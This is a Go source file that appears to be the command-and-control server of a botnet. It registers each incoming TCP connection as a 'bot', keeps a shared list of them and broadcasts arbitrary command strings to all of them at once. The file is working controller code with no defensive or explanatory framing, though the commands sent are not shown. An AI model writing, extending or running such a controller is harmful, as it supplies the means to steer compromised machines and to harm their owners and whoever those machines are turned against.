package bot

import (
	"bufio"
	"fmt"
	"net"
	"sync"
)

type Bot struct {
	Addr string
	Conn net.Conn
}

var (
	Bots  []Bot
	BotMu sync.Mutex
)

func GetBots() int {
	return len(Bots)
}

func BotHandler(Connection net.Conn) {

	BotMu.Lock()

	for _, Bot := range Bots {
		if Bot.Addr == Connection.RemoteAddr().String() {
			BotMu.Unlock()
			Connection.Close()
			return
		}
	}

	Bot := Bot{Addr: Connection.RemoteAddr().String(), Conn: Connection}
	Bots = append(Bots, Bot)
	BotMu.Unlock()

	Buffer := make([]byte, 1)
	for {
		_, ERR := Connection.Read(Buffer)
		if ERR != nil {
			fmt.Print("bot disconnected\n")
			RemoveBot(Bot.Addr)
			Connection.Close()
			return
		}
	}

}

func SendCommandToBots(Command string) {

	BotMu.Lock()
	defer BotMu.Unlock()

	for _, Bot := range Bots {
		Writer := bufio.NewWriter(Bot.Conn)
		Writer.WriteString(Command + "\n")
		Writer.Flush()
	}

}

func RemoveBot(Address string) {
	BotMu.Lock()
	defer BotMu.Unlock()

	for i, Bot := range Bots {
		if Bot.Addr == Address {
			Bots = append(Bots[:i], Bots[i+1:]...)
			return
		}
	}
}
